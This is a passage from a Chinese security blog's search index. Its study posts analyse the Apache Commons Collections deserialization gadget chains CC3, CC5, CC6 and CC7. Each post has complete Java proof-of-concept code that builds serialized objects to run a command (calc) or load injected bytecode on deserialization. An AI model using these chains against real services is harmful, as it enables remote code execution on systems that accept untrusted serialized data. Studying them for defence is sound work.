java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC3</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        TemplatesImpl templates = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\"></span><br><span class=\"line\">        Class tc = templates.getClass();</span><br><span class=\"line\">        Field nameField = tc.getDeclaredField(<span class=\"string\">&quot;_name&quot;</span>);</span><br><span class=\"line\">        nameField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        nameField.set(templates,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Field byteField = tc.getDeclaredField(<span class=\"string\">&quot;_bytecodes&quot;</span>);</span><br><span class=\"line\">        byteField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;D:/cc1/target/classes/Calc.class&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[][] codes = &#123;code&#125;;</span><br><span class=\"line\">        byteField.set(templates,codes);</span><br><span class=\"line\"></span><br><span class=\"line\">        Field tfactoryField = tc.getDeclaredField(<span class=\"string\">&quot;_tfactory&quot;</span>);</span><br><span class=\"line\">        tfactoryField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        tfactoryField.set(templates,<span class=\"keyword\">new</span> TransformerFactoryImpl());</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">//InstantiateTransformer</span></span><br><span class=\"line\">        InstantiateTransformer instantiateTransformer = <span class=\"keyword\">new</span> InstantiateTransformer(<span class=\"keyword\">new</span> Class[]&#123;Templates.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;templates&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class=\"line\">                instantiateTransformer</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map lazymap = LazyMap.decorate(map, chainedTransformer);  <span class=\"comment\">//一旦调用get方法，就实现rce</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor cons = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        cons.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, lazymap);</span><br><span class=\"line\">        Map proxymap = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),<span class=\"keyword\">new</span> Class[]&#123;Map.class&#125;,handler);</span><br><span class=\"line\"></span><br><span class=\"line\">        Object o = cons.newInstance(Retention.class,proxymap);</span><br><span class=\"line\">        <span class=\"comment\">//serialize(o);</span></span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"流程图-1\"><a href=\"#流程图-1\" class=\"headerlink\" title=\"流程图\"></a>流程图</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/291fcb6137d443c19d5b2acc99dc3b2e.png\"></p>\n","categories":["Java反序列化"]},{"title":"CommonsCollections-5,7","url":"/2023/12/25/CommonsCollections-5,7/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>简单的完结篇，芜湖</p>\n<h1 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h1><ul>\n<li>jdk1.8</li>\n<li>Commons Collections 3.1</li>\n</ul>\n<a id=\"more\"></a>\n<h1 id=\"CC5\"><a href=\"#CC5\" class=\"headerlink\" title=\"CC5\"></a>CC5</h1><h1 id=\"利用链\"><a href=\"#利用链\" class=\"headerlink\" title=\"利用链\"></a>利用链</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ObjectInputStream.readObject()</span><br><span class=\"line\">            BadAttributeValueExpException.readObject()</span><br><span class=\"line\">                TiedMapEntry.toString()</span><br><span class=\"line\">                    LazyMap.get()</span><br><span class=\"line\">                        ChainedTransformer.transform()</span><br><span class=\"line\">                            ConstantTransformer.transform()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Class.getMethod()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Runtime.getRuntime()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>这里引入新类 <strong>TiedMapEntry</strong> 与 <strong>BadAttributeValueExpException</strong></p>\n<p>在 <strong>BadAttributeValueExpException</strong>的 <strong>readObject</strong> 中调用 valObj 的 <strong>toString</strong> 方法 而 <strong>valObj是通过获取val的值来进行赋值</strong>，也就是可控</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/5e1f1194bea14d1c80e8513dec1fe44d.png\"></p>\n<p>在 TiedMapEntry 的 toString 中调用 getValue 函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/485bd5196a20408e85fa563f6ead932f.png\"></p>\n<p>发现在 getValue 函数中map key都可控，可以调用 LazyMap的 get方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/d4d095f75bbd4c32a77318f7e89c9044.png\"></p>\n<h1 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC5</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>]&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>]&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//ChainedTransformer实例</span></span><br><span class=\"line\">        Transformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map lazymap = LazyMap.decorate(map, chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazymap,<span class=\"number\">123</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        BadAttributeValueExpException badAttributeValueExpException = <span class=\"keyword\">new</span> BadAttributeValueExpException(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        setFieldValue(badAttributeValueExpException,<span class=\"string\">&quot;val&quot;</span>,tiedMapEntry);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//serialize(badAttributeValueExpException);</span></span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser2.bin&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object object, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(object, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser2.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"CC7\"><a href=\"#CC7\" class=\"headerlink\" title=\"CC7\"></a>CC7</h1><h1 id=\"利用链-1\"><a href=\"#利用链-1\" class=\"headerlink\" title=\"利用链\"></a>利用链</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Hashtable.readObject()</span><br><span class=\"line\">      Hashtable.reconstitutionPut()</span><br><span class=\"line\">            AbstractMapDecorator.equals()</span><br><span class=\"line\">                AbstractMap.equals()</span><br><span class=\"line\">                  LazyMap.get()</span><br><span class=\"line\">                    ChainedTransformer.transform()</span><br><span class=\"line\">                      ConstantTransformer.transform()</span><br><span class=\"line\">                        InvokerTransformer.transform()</span><br><span class=\"line\">                          …………</span><br></pre></td></tr></table></figure>\n<h1 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p><strong>Hashtable</strong> 的 readObject 方法调用了<strong>reconstitutionPut()</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/ee840ac12119486bac8016621f80abca.png\"></p>\n<p>调用 e.key的 equals方法，最后选择 <strong>AbstractMap</strong>中的 equals方法，但是是一个abstract类，构造poc时选择其<strong>子类HashMap</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/38c4bc241c3243f582f221491be1879b.png\"></p>\n<p>调用get方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/11249f7f1eb94ff09ddb6d0669646b0b.png\"></p>\n<h1 id=\"poc-1\"><a href=\"#poc-1\" class=\"headerlink\" title=\"poc\"></a>poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.AbstractMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC7</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] fakeTransformer = <span class=\"keyword\">new</span> Transformer[]&#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>]&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>]&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//ChainedTransformer实例</span></span><br><span class=\"line\">        <span class=\"comment\">//先设置假的 Transformer 数组，防止生成时执行命令</span></span><br><span class=\"line\">        Transformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(fakeTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//LazyMap实例</span></span><br><span class=\"line\">        Map innerMap1 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        Map innerMap2 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\"></span><br><span class=\"line\">        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class=\"line\">        lazyMap1.put(<span class=\"string\">&quot;yy&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class=\"line\">        lazyMap2.put(<span class=\"string\">&quot;zZ&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Hashtable hashtable = <span class=\"keyword\">new</span> Hashtable();</span><br><span class=\"line\">        hashtable.put(lazyMap1, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        hashtable.put(lazyMap2, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//通过反射设置真的 transformer 数组</span></span><br><span class=\"line\">        setFieldValue(chainedTransformer,<span class=\"string\">&quot;iTransformers&quot;</span>,transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除</span></span><br><span class=\"line\">        lazyMap2.remove(<span class=\"string\">&quot;yy&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(hashtable);</span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object object, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(object, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://xz.aliyun.com/t/9409#toc-7\">CC链 1-7 分析 - 先知社区 (aliyun.com)</a></p>\n<p><a href=\"https://xz.aliyun.com/t/9874#toc-17\">CC链学习-中 - 先知社区 (aliyun.com)</a></p>\n","categories":["Java反序列化"]},{"title":"CommonsCollections-6","url":"/2023/12/25/CommonsCollections-6/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;*</span><br><span class=\"line\">    Gadget chain:</span><br><span class=\"line\">        java.io.ObjectInputStream.readObject()</span><br><span class=\"line\">            java.util.HashSet.readObject()</span><br><span class=\"line\">                java.util.HashMap.put()</span><br><span class=\"line\">                java.util.HashMap.hash()</span><br><span class=\"line\">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class=\"line\">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class=\"line\">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class=\"line\">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class=\"line\">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class=\"line\">                            java.lang.reflect.Method.invoke()</span><br><span class=\"line\">                                java.lang.Runtime.exec()</span><br><span class=\"line\">    by @matthias_kaiser</span><br><span class=\"line\">*&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>CC6解决了高版本Java的限制，而且利用更加通用。不受版本限制</p>\n<a id=\"more\"></a>\n\n<h1 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h1><p><strong>HashMap.readObject -&gt;TiedMapEntry.hashCode -&gt;LazyMap.get -&gt;ChainedTransformer.transform</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/b7e09b701ee44d8e9045faf96dfbb4c2.png\"></p>\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>HashMap中的 readObject 中会调用 hash 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/273f6bbdb526493fbe8de18b590f1802.png\"></p>\n<p>进而调用 key 的 hashCode，正如URLdns链前半部分一样</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/4ca0b212a6cd4d3ab915ec363bf76e75.png\"></p>\n<p>在 <strong>TiedMapEntry</strong> 中的 <strong>hashCode</strong> 中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/f3432a0a49fa47b694fb8e817bc10a44.png\"></p>\n<p>调用了<strong>getValue</strong>，又调用了 map 的 <strong>get方法</strong>，参数都可控，可以走到 <strong>LazyMap</strong> 的链子中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/0a66313107cc4ffbbd26d26a82a72218.png\"></p>\n<h1 id=\"put问题\"><a href=\"#put问题\" class=\"headerlink\" title=\"put问题\"></a>put问题</h1><p>这里存在一个跟URLdns链一样的问题，就是HashMap在序列化时，put会提前调用hash函数，利用<strong>反射在后面进行参数的修改</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">//下面这两种就是差别地方，先断掉链子</span></span><br><span class=\"line\">        <span class=\"comment\">//Map lazymap = LazyMap.decorate(map, chainedTransformer);</span></span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazymap,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        hashmap.put(tiedMapEntry,<span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"comment\">//利用反射修改factory参数，重新接上链子</span></span><br><span class=\"line\">        Class c = LazyMap.class;</span><br><span class=\"line\">        Field factory = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factory.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        factory.set(lazymap,chainedTransformer);</span><br><span class=\"line\">        